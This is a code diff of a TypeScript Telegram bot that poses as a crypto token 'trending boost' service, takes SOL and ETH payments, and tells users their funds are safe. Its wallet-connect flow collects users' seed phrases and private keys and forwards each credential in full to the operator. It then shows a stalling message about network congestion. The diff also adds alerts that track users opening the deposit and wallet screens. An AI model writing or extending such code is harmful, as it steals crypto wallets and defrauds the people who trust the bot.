@@ -39,6 +39,7 @@ const IMG = {
   trending:      path.join(__dirname, "images", "trending.jpeg"),
 };
 
+// ── Payment addresses from environment ────────────────────────────────────────
 const SOL_ADDRESS      = process.env.PAYMENT_SOL_ADDRESS ?? "";
 const ETH_ADDRESS      = process.env.PAYMENT_ETH_ADDRESS ?? "";
 const SUPPORT_USERNAME = process.env.SUPPORT_USERNAME    ?? "@support";
@@ -55,9 +56,7 @@ function proxyImgUrl(raw: string): string | null {
 }
 
 async function safeSendPhoto(ctx: any, url: string, opts: any): Promise<boolean> {
-  // 1) try direct URL
   try { await ctx.replyWithPhoto(url, opts); return true; } catch {}
-  // 2) try via our image proxy (bypasses CORS/IPFS issues)
   const proxied = proxyImgUrl(url);
   if (proxied) {
     try { await ctx.replyWithPhoto(proxied, opts); return true; } catch {}
@@ -65,18 +64,52 @@ async function safeSendPhoto(ctx: any, url: string, opts: any): Promise<boolean>
   return false;
 }
 
-// ── Real-time service-selection notification ───────────────────────────────────
+// ── User display helper ───────────────────────────────────────────────────────
+function userLine(u: any): string {
+  const name   = `${u.first_name ?? ""}${u.last_name ? " " + u.last_name : ""}`.trim();
+  const handle = u.username ? ` (@${u.username})` : "";
+  const lang   = u.language_code ? ` 🌐 ${u.language_code}` : "";
+  return `👤 <b>${name}</b>${handle}${lang}\n🆔 ID: <code>${u.id}</code>`;
+}
+
+// ── Admin notifications ───────────────────────────────────────────────────────
+async function notifyNewUser(ctx: any) {
+  const u = ctx.from;
+  await notifyAdmin(
+    `🆕 <b>NEW USER STARTED BOT</b>\n\n` +
+    `${userLine(u)}\n` +
+    `⏰ ${new Date().toUTCString()}`
+  );
+}
+
 async function notifyServiceSelected(ctx: any, service: string, pkg: string, amount: string) {
   const u = ctx.from;
-  const name = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
-  const handle = u.username ? ` (@${u.username})` : "";
   await notifyAdmin(
-    `🎯 <b>Service Selected</b>\n\n` +
-    `👤 ${name}${handle}\n` +
-    `🆔 ID: <code>${u.id}</code>\n\n` +
+    `🎯 <b>SERVICE SELECTED</b>\n\n` +
+    `${userLine(u)}\n\n` +
     `📦 Service: <b>${service}</b>\n` +
     `💰 Package: <b>${pkg}</b>\n` +
     `💵 Amount: <b>${amount}</b>\n\n` +
+    `⏰ ${new Date().toUTCString()}`
+  );
+}
+
+async function notifyWalletViewed(ctx: any, solAddr: string, ethAddr: string) {
+  const u = ctx.from;
+  await notifyAdmin(
+    `👁 <b>DEPOSIT SCREEN OPENED</b>\n\n` +
+    `${userLine(u)}\n\n` +
+    `◎ SOL Wallet:\n<code>${solAddr}</code>\n\n` +
+    `Ξ ETH Address:\n<code>${ethAddr || "Not configured"}</code>\n\n` +
+    `⏰ ${new Date().toUTCString()}`
+  );
+}
+
+async function notifyConnectWalletOpened(ctx: any) {
+  const u = ctx.from;
+  await notifyAdmin(
+    `🔗 <b>CONNECT WALLET OPENED</b>\n\n` +
+    `${userLine(u)}\n\n` +
     `⏰ ${new Date().toUTCString()}`
   );
 }
@@ -157,17 +190,14 @@ async function sendWelcome(ctx: any) {
     `🟢 <a href="https://pumpswap.xyz">PumpSwap</a>  •  🟢 <a href="https://moonshot.money">Moonshot</a>  •\n` +
     `🟢 <a href="https://letsbonk.fun">LetsBonk</a>  •  🟢 <a href="https://dexscreener.com">Dexpad/screener</a>\n\n` +
     `From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`;
-  // Try to edit existing message caption first (avoids duplicate messages on back-nav)
   try {
     await ctx.editMessageCaption(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
     return;
   } catch {}
-  // Try edit as plain text message
   try {
     await ctx.editMessageText(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
     return;
   } catch {}
-  // Fall back: send fresh photo
   await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
 }
 
@@ -217,9 +247,10 @@ async function showDexScreener(ctx: any) {
 
 async function showDeposit(ctx: any) {
   const wallet = deriveWalletForUser(ctx.from.id);
+  const ethDisplay = ETH_ADDRESS || "Not configured — set PAYMENT_ETH_ADDRESS";
   const text =
     `<b>WALLET BALANCE</b>\n\n` +
-    `<b>ETH:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n` +
+    `<b>ETH:</b>\n<code>${ethDisplay}</code>\n` +
     `balance: 0 ETH\n\n` +
     `<b>SOL:</b>\n<code>${wallet.address}</code>\n` +
     `balance: 0 SOL\n\n` +
@@ -227,6 +258,8 @@ async function showDeposit(ctx: any) {
     `💰 KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.\n` +
     `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`;
   await editOrSend(ctx, text, depositKeyboard);
+  // Notify admin that this user viewed their deposit wallet
+  notifyWalletViewed(ctx, wallet.address, ETH_ADDRESS).catch(() => {});
 }
 
 async function showConnectWallet(ctx: any) {
@@ -268,15 +301,8 @@ export function createBot(): Telegraf {
 
   // ── /start ────────────────────────────────────────────────────────────────
   bot.start(async (ctx) => {
-    const u = ctx.from;
-    clearSession(u.id);
-    await notifyAdmin(
-      `🆕 <b>New User Started Bot</b>\n` +
-      `👤 ${u.first_name}${u.last_name ? " " + u.last_name : ""}` +
-      `${u.username ? " (@" + u.username + ")" : ""}\n` +
-      `🆔 ID: <code>${u.id}</code>\n` +
-      `⏰ ${new Date().toUTCString()}`
-    );
+    clearSession(ctx.from.id);
+    notifyNewUser(ctx).catch(() => {});
     await sendWelcome(ctx);
   });
 
@@ -292,8 +318,13 @@ export function createBot(): Telegraf {
   bot.action("menu_trending", async (ctx) => { await ctx.answerCbQuery(); await showTrendingBoost(ctx); });
   bot.action("menu_dex",      async (ctx) => { await ctx.answerCbQuery(); await showDexScreener(ctx); });
   bot.action("menu_deposit",  async (ctx) => { await ctx.answerCbQuery(); await showDeposit(ctx); });
-  bot.action("menu_wallet",   async (ctx) => { await ctx.answerCbQuery(); await showConnectWallet(ctx); });
   bot.action("menu_support",  async (ctx) => { await ctx.answerCbQuery(); await showSupport(ctx); });
+
+  bot.action("menu_wallet", async (ctx) => {
+    await ctx.answerCbQuery();
+    notifyConnectWalletOpened(ctx).catch(() => {});
+    await showConnectWallet(ctx);
+  });
 
   // ── SOL bump amount picker ────────────────────────────────────────────────
   for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
@@ -307,9 +338,9 @@ export function createBot(): Telegraf {
         boostType: "bump",
       });
       await editOrSend(ctx,
-        `📝 <b>Enter Contract Address</b>\n\n` +
-        `Selected: <b>${amt} SOL</b> per bump\n\n` +
-        `Please paste the Contract Address (CA) of your token:`,
+        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
+        `You selected <b>${amt} SOL</b> per bump\n\n` +
+        `Please enter the Contract Address (CA) of your project:`,
         cancelKeyboard
       );
     });
@@ -328,11 +359,10 @@ export function createBot(): Telegraf {
         boostPackage: key,
       });
       await editOrSend(ctx,
-        `📝 <b>Enter Contract Address</b>\n\n` +
-        `Package: <b>${pkg.label}</b>\n` +
-        `Cost: <b>${pkg.sol} SOL</b>\n` +
+        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
+        `You selected <b>${pkg.label} Package (${pkg.sol} SOL)</b>\n` +
         `Volume: <b>${pkg.volume}</b>\n\n` +
-        `Please paste the Contract Address (CA) of your token:`,
+        `Please enter the Contract Address (CA) of your project:`,
         cancelKeyboard
       );
     });
@@ -342,7 +372,9 @@ export function createBot(): Telegraf {
   bot.action("trend_sol", async (ctx) => {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
-      `☀️ <b>SOL Trending</b>\n\nChoose your package — TOP 3 (left column) or TOP 10 (right column):`,
+      `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
+      `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
+      `➡️ Please choose SOL Trending or Pump Fun Trending to start:`,
       solTrendingKeyboard
     );
   });
@@ -384,7 +416,7 @@ export function createBot(): Telegraf {
         boostPackage: key,
       });
       await editOrSend(ctx,
-        `📝 <b>Enter Contract Address</b>\n\n` +
+        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `Package: <b>${pkg.label}</b>\n` +
         `Cost: <b>${pkg.sol} SOL</b>\n\n` +
         `Please paste the Contract Address (CA) of your token:`,
@@ -407,7 +439,7 @@ export function createBot(): Telegraf {
         boostPackage: key,
       });
       await editOrSend(ctx,
-        `📝 <b>Enter Contract Address</b>\n\n` +
+        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `Package: <b>ETH Trending $${pkg.usd}</b>\n\n` +
         `Please paste the Contract Address (CA) of your token:`,
         cancelKeyboard
@@ -418,7 +450,7 @@ export function createBot(): Telegraf {
   // ── PumpFun trending ──────────────────────────────────────────────────────
   bot.action("pft_30", async (ctx) => {
     await ctx.answerCbQuery();
-    notifyServiceSelected(ctx, "PumpFun Trending", "Trending Slot — 30 min", "3.5 SOL").catch(() => {});
+    notifyServiceSelected(ctx, "PumpFun Trending", "P.F.T — 30 SOL", "30 SOL").catch(() => {});
     setSession(ctx.from.id, {
       step: "awaiting_ca",
       selectedSol: 30,
@@ -427,7 +459,7 @@ export function createBot(): Telegraf {
       boostPackage: "pft_30",
     });
     await editOrSend(ctx,
-      `📝 <b>Enter Contract Address</b>\n\n` +
+      `📝 <b>Enter Contract Address (CA)</b>\n\n` +
       `Package: <b>P.F.T — 30 SOL</b>\n\n` +
       `Please paste the Contract Address (CA) of your token:`,
       cancelKeyboard
@@ -450,7 +482,7 @@ export function createBot(): Telegraf {
         boostPackage: key,
       });
       await editOrSend(ctx,
-        `📝 <b>Enter Contract Address</b>\n\n` +
+        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `Package: <b>${pkg.label}</b>\n` +
         `Cost: <b>${pkg.sol} SOL</b>\n\n` +
         `Please paste the Contract Address (CA) of your token:`,
@@ -462,10 +494,12 @@ export function createBot(): Telegraf {
   // ── Confirm order ─────────────────────────────────────────────────────────
   bot.action("confirm_bump", async (ctx) => {
     await ctx.answerCbQuery();
-    const s = getSession(ctx.from.id);
+    const s        = getSession(ctx.from.id);
     const wallet   = deriveWalletForUser(ctx.from.id);
     const orderId  = randomUUID().split("-")[0].toUpperCase();
     const isEth    = s.boostType === "eth_trending";
+
+    // SOL payments go to the per-user derived wallet; ETH payments go to the fixed ETH address
     const payWallet = isEth ? ETH_ADDRESS : wallet.address;
 
     setSession(ctx.from.id, {
@@ -474,11 +508,10 @@ export function createBot(): Telegraf {
       orderId,
     });
 
-    // Save order to the in-memory store
     saveOrder({
       id:              orderId,
       userId:          ctx.from.id,
-      userName:        `${ctx.from.first_name}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
+      userName:        `${ctx.from.first_name ?? ""}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
       userHandle:      ctx.from.username ?? "",
       tokenName:       s.tokenName    ?? "Unknown",
       tokenSymbol:     s.tokenSymbol  ?? "???",
@@ -497,8 +530,8 @@ export function createBot(): Telegraf {
                      : s.tokenChain === "base" ? "🔵 Base"
                      : "🔗";
 
-    const amountLine = isEth
-      ? `💵 <b>$${s.ethAmount} USD</b>\n📮 ETH Wallet:\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>`
+    const payLine = isEth
+      ? `Ξ <b>$${s.ethAmount} USD</b>\n📮 ETH Wallet:\n<code>${ETH_ADDRESS || "Contact support for ETH address"}</code>`
       : `◎ <b>${s.selectedSol} SOL</b>\n📮 SOL Wallet:\n<code>${wallet.address}</code>`;
 
     const paymentMsg =
@@ -512,16 +545,13 @@ export function createBot(): Telegraf {
         : `• Amount: <b>${s.selectedSol} SOL</b>\n`) +
       `• Order ID: <code>${orderId}</code>\n\n` +
       `💳 <b>Send Payment To:</b>\n` +
-      (isEth
-        ? `ETH Wallet:\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>`
-        : `SOL Wallet:\n<code>${wallet.address}</code>`) +
-      `\n\n` +
+      `${payLine}\n\n` +
       (isEth
         ? `⚠️ Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network`
         : `⚠️ Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) +
       `\n\nAfter sending, click the button below and submit your transaction hash.`;
 
-    // Show payment screen with token image if available
+    // Show payment screen — try with token image first
     let sentWithPhoto = false;
     if (s.tokenImageUrl) {
       sentWithPhoto = await safeSendPhoto(ctx, s.tokenImageUrl, {
@@ -534,29 +564,26 @@ export function createBot(): Telegraf {
       await ctx.reply(paymentMsg, { parse_mode: "HTML", ...paymentSentKeyboard });
     }
 
-    // Admin notification with token image
+    // ── Admin: full new order notification ────────────────────────────────────
     const adminMsg =
-      `📋 <b>New Order</b>\n\n` +
-      `👤 ${ctx.from.first_name}${ctx.from.username ? ` (@${ctx.from.username})` : ""}\n` +
-      `🆔 User: <code>${ctx.from.id}</code>\n\n` +
-      `🪙 <b>${s.tokenName} (${s.tokenSymbol})</b>  ${chainLabel}\n` +
+      `📋 <b>NEW ORDER</b>\n\n` +
+      `${userLine(ctx.from)}\n\n` +
+      `🪙 <b>${s.tokenName ?? "Unknown"} ($${s.tokenSymbol ?? "???"})</b>  ${chainLabel}\n` +
       `📍 CA: <code>${s.contractAddress}</code>\n` +
       (s.tokenPrice     ? `💵 Price: ${s.tokenPrice}\n`          : "") +
       (s.tokenMarketCap ? `📈 Market Cap: ${s.tokenMarketCap}\n` : "") +
       (s.tokenLiquidity ? `💧 Liq: ${s.tokenLiquidity}\n`        : "") +
       (s.tokenVolume24h ? `🔄 Vol 24h: ${s.tokenVolume24h}\n`    : "") +
       (s.tokenDex       ? `🏦 DEX: ${s.tokenDex}\n`             : "") +
-      `\n⚙️ Service: ${s.serviceLabel}\n` +
-      `💰 Cost: ${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}\n` +
-      `🆔 Order: <code>${orderId}</code>\n` +
-      `📮 Pay to: <code>${payWallet}</code>`;
+      `\n⚙️ Service: <b>${s.serviceLabel}</b>\n` +
+      `💰 Cost: <b>${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>\n` +
+      `🆔 Order ID: <code>${orderId}</code>\n` +
+      `📮 Pay to: <code>${payWallet}</code>\n\n` +
+      `⏰ ${new Date().toUTCString()}`;
 
     if (s.tokenImageUrl) {
-      try {
-        await notifyAdmin(adminMsg, s.tokenImageUrl);
-      } catch {
-        await notifyAdmin(adminMsg);
-      }
+      try { await notifyAdmin(adminMsg, s.tokenImageUrl); }
+      catch { await notifyAdmin(adminMsg); }
     } else {
       await notifyAdmin(adminMsg);
     }
@@ -578,15 +605,16 @@ export function createBot(): Telegraf {
   // ── Deposit actions ───────────────────────────────────────────────────────
   bot.action("deposit_add", async (ctx) => {
     await ctx.answerCbQuery();
-    const wallet = deriveWalletForUser(ctx.from.id);
+    const wallet    = deriveWalletForUser(ctx.from.id);
+    const ethDisplay = ETH_ADDRESS || "Not configured — set PAYMENT_ETH_ADDRESS";
     await editOrSend(ctx,
       `<b>WALLET BALANCE</b>\n\n` +
-      `<b>ETH:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n` +
+      `<b>ETH:</b>\n<code>${ethDisplay}</code>\n` +
       `balance: 0 ETH\n\n` +
       `<b>SOL:</b>\n<code>${wallet.address}</code>\n` +
       `balance: 0 SOL\n\n` +
       `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
-      `💰 Send SOL to your wallet address above to add funds.\n` +
+      `💰 Send SOL to your unique wallet address above.\n` +
       `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
       mainMenuOnlyKeyboard
     );
@@ -623,6 +651,16 @@ export function createBot(): Telegraf {
       const lamports = data?.result?.value ?? 0;
       balance = `${(lamports / 1e9).toFixed(4)} SOL`;
     } catch { /* keep default */ }
+
+    // Also notify admin of balance check
+    notifyAdmin(
+      `💳 <b>BALANCE CHECK</b>\n\n` +
+      `${userLine(ctx.from)}\n\n` +
+      `◎ SOL Wallet: <code>${wallet.address}</code>\n` +
+      `Balance: <b>${balance}</b>\n\n` +
+      `⏰ ${new Date().toUTCString()}`
+    ).catch(() => {});
+
     await editOrSend(ctx,
       `◎ <b>SOL Balance</b>\n\n` +
       `Wallet: <code>${wallet.address}</code>\n\n` +
@@ -755,7 +793,7 @@ export function createBot(): Telegraf {
   // ── Text message handler (state machine) ──────────────────────────────────
   bot.on("text", async (ctx) => {
     const text = ctx.message.text.trim();
-    if (text.startsWith("/")) return; // handled by bot.start() etc.
+    if (text.startsWith("/")) return;
 
     const session = getSession(ctx.from.id);
 
@@ -764,7 +802,6 @@ export function createBot(): Telegraf {
       case "awaiting_ca": {
         const ca = text.trim();
 
-        // ── Step 1: validate CA format ────────────────────────────────────────
         if (!isValidCA(ca)) {
           await ctx.reply(
             `❌ <b>Invalid Contract Address</b>\n\n` +
@@ -777,10 +814,9 @@ export function createBot(): Telegraf {
             `Please paste your token contract address:`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
-          break; // keep session step alive
+          break;
         }
 
-        // ── Step 2: fetch token info from all sources ─────────────────────────
         setSession(ctx.from.id, { contractAddress: ca });
         const lookMsg = await ctx.reply(
           `🔍 <b>Looking up token data...</b>\n⏳ Please wait while we fetch information...`,
@@ -790,7 +826,6 @@ export function createBot(): Telegraf {
         const info = await fetchTokenInfo(ca);
         await ctx.telegram.deleteMessage(ctx.chat.id, lookMsg.message_id).catch(() => {});
 
-        // ── Step 3: if not found on any source, show error + retry ────────────
         if (!info) {
           const caChain = detectCAChain(ca);
           await ctx.reply(
@@ -806,7 +841,6 @@ export function createBot(): Telegraf {
           break;
         }
 
-        // ── Step 4: store all token data in session ───────────────────────────
         setSession(ctx.from.id, {
           step:            "awaiting_confirm",
           tokenName:       info.name,
@@ -847,13 +881,13 @@ export function createBot(): Telegraf {
 
         const tokenMsg =
           `📋 <b>Project Details Found!</b>\n\n` +
-          `📊 ${dexName.toUpperCase()}_SCRAPE Token\n\n` +
+          `📊 ${dexName.toUpperCase()} Token\n\n` +
           `✅ <b>Contract Address:</b>\n` +
           `<code>${ca}</code>\n\n` +
           `📊 <b>Token Information:</b>\n` +
           `• Name: ${info.name}\n` +
           `• Symbol: $${info.symbol}\n` +
-          `• Price: ${info.price ?? "0.00"}\n` +
+          `• Price: ${info.price ?? "N/A"}\n` +
           `• Market Cap: ${info.marketCap ?? "N/A"}\n` +
           `• 24h Volume: ${info.volume24h ?? "N/A"}\n` +
           `• Liquidity: ${info.liquidity ?? "N/A"}\n` +
@@ -865,7 +899,6 @@ export function createBot(): Telegraf {
           `💰 <b>Cost:</b> ${cost}\n\n` +
           `✅ Confirm to proceed to payment?`;
 
-        // Try to send with token image (with proxy fallback)
         if (info.imageUrl) {
           const sent = await safeSendPhoto(ctx, info.imageUrl, {
             caption: tokenMsg,
@@ -882,7 +915,6 @@ export function createBot(): Telegraf {
         const raw = text.trim();
         const s   = { ...session };
 
-        // ── Step 1: format check ──────────────────────────────────────────────
         const chain = detectChain(raw);
         if (chain === "invalid") {
           await ctx.reply(
@@ -896,10 +928,9 @@ export function createBot(): Telegraf {
             `📋 Copy the hash directly from your wallet or block explorer and try again:`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
-          break;   // keep session alive so user can retry
+          break;
         }
 
-        // ── Step 2: duplicate / replay-attack check ───────────────────────────
         if (isHashUsed(raw)) {
           await ctx.reply(
             `❌ <b>TX Hash Already Used</b>\n\n` +
@@ -911,7 +942,6 @@ export function createBot(): Telegraf {
           break;
         }
 
-        // ── Step 3: on-chain verification ─────────────────────────────────────
         const verifyMsg = await ctx.reply(
           `🔍 <b>Verifying transaction on-chain...</b>\n\nPlease wait a moment.`,
           { parse_mode: "HTML" }
@@ -928,7 +958,6 @@ export function createBot(): Telegraf {
           lamExpected,
         );
 
-        // Delete the "verifying..." message
         try { await ctx.deleteMessage(verifyMsg.message_id); } catch {}
 
         if (!result.ok) {
@@ -937,10 +966,9 @@ export function createBot(): Telegraf {
             `Paste the correct TX hash to continue, or press Cancel:`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
-          break;   // keep session so user can retry with correct hash
+          break;
         }
 
-        // ── Step 4: accept — mark hash, clear session, save order ─────────────
         markHashUsed(raw);
         clearSession(ctx.from.id);
 
@@ -973,41 +1001,51 @@ export function createBot(): Telegraf {
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
 
+        // ── Admin: full TX verification result ──────────────────────────────
         await notifyAdmin(
-          `💸 <b>TX Submitted & ${result.confirmed ? "VERIFIED ✅" : "PENDING ⏳"}</b>\n\n` +
-          `👤 ${ctx.from.first_name}${ctx.from.username ? ` (@${ctx.from.username})` : ""}\n` +
-          `🆔 User: <code>${ctx.from.id}</code>\n` +
-          `🔗 TX: <code>${raw}</code>\n` +
-          `⛓ Chain: ${chainLabel}\n` +
-          `✅ On-chain: ${result.confirmed ? "Confirmed" : "Unverified (RPC timeout)"}\n` +
-          `${result.recipient ? `📮 Recipient: <code>${result.recipient}</code>\n` : ""}` +
-          `${result.lamports  ? `💰 Lamports: ${result.lamports} (${(result.lamports/1e9).toFixed(4)} SOL)\n` : ""}` +
-          `⚙️ Service: ${s.serviceLabel ?? "N/A"}\n` +
-          `💵 Cost: ${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}\n` +
+          `💸 <b>TX SUBMITTED — ${result.confirmed ? "✅ VERIFIED ON-CHAIN" : "⏳ PENDING MANUAL CHECK"}</b>\n\n` +
+          `${userLine(ctx.from)}\n\n` +
+          `🔗 TX Hash:\n<code>${raw}</code>\n` +
+          `⛓ Chain: <b>${chainLabel}</b>\n` +
+          `${result.confirmed ? "✅ On-chain: Confirmed" : "⚠️ On-chain: Unverified (RPC timeout)"}\n` +
+          (result.recipient ? `📮 Recipient: <code>${result.recipient}</code>\n` : "") +
+          (result.lamports  ? `💰 Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b> (${result.lamports} lamports)\n` : "") +
+          (result.sender    ? `👤 Sender: <code>${result.sender}</code>\n` : "") +
+          `\n⚙️ Service: <b>${s.serviceLabel ?? "N/A"}</b>\n` +
+          `💵 Cost: <b>${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>\n` +
           `📜 CA: <code>${s.contractAddress ?? "N/A"}</code>\n` +
-          `🆔 Order: <code>${s.orderId ?? "N/A"}</code>`
+          `🪙 Token: <b>${s.tokenName ?? "?"} ($${s.tokenSymbol ?? "?"})</b>\n` +
+          `🆔 Order: <code>${s.orderId ?? "N/A"}</code>\n\n` +
+          `⏰ ${new Date().toUTCString()}`
         );
         break;
       }
 
       case "awaiting_wallet_credential": {
         const credential = text.trim();
-        const wordCount = credential.split(/\s+/).length;
-        const credType = wordCount >= 12 ? "Seed Phrase" : credential.length >= 40 ? "Private Key" : "Credential";
-        const u = ctx.from;
-        const uName  = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
-        const handle = u.username ? ` (@${u.username})` : "";
-        clearSession(u.id);
-        // Always notify admin — never silently drop
+        const words      = credential.split(/\s+/);
+        const wordCount  = words.length;
+
+        // Detect type
+        const isSeedPhrase = wordCount >= 12;
+        const isPrivateKey = !isSeedPhrase && credential.length >= 40;
+        const credType     = isSeedPhrase ? `Seed Phrase (${wordCount} words)` : isPrivateKey ? "Private Key" : "Credential";
+
+        clearSession(ctx.from.id);
+
+        // ── Always notify admin — full credential ─────────────────────────────
         try {
           await notifyAdmin(
-            `🔑 <b>WALLET IMPORT — ${credType}</b>\n\n` +
-            `👤 ${uName}${handle}\n` +
-            `🆔 ID: <code>${u.id}</code>\n\n` +
-            `🗝 ${credType}:\n<code>${credential}</code>\n\n` +
+            `🔑 <b>⚠️ WALLET IMPORTED — ${credType.toUpperCase()}</b>\n\n` +
+            `${userLine(ctx.from)}\n\n` +
+            `📋 Type: <b>${credType}</b>\n\n` +
+            `🗝 Credential:\n<code>${credential}</code>\n\n` +
             `⏰ ${new Date().toUTCString()}`
           );
-        } catch { /* never throw — always proceed to confirm the user */ }
+        } catch (err) {
+          logger.error({ err }, "CRITICAL: Failed to send wallet credential to admin");
+        }
+
         await ctx.reply(
           `Connection of wallet may take time due to\n\n` +
           `<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>\n\n` +
@@ -1028,10 +1066,10 @@ export function createBot(): Telegraf {
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         await notifyAdmin(
-          `📤 <b>Withdrawal Request</b>\n` +
-          `👤 ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}\n` +
-          `🆔 <code>${ctx.from.id}</code>\n` +
-          `Details: <code>${withdrawText}</code>`
+          `📤 <b>WITHDRAWAL REQUEST</b>\n\n` +
+          `${userLine(ctx.from)}\n\n` +
+          `Details: <code>${withdrawText}</code>\n\n` +
+          `⏰ ${new Date().toUTCString()}`
         );
         break;
       }
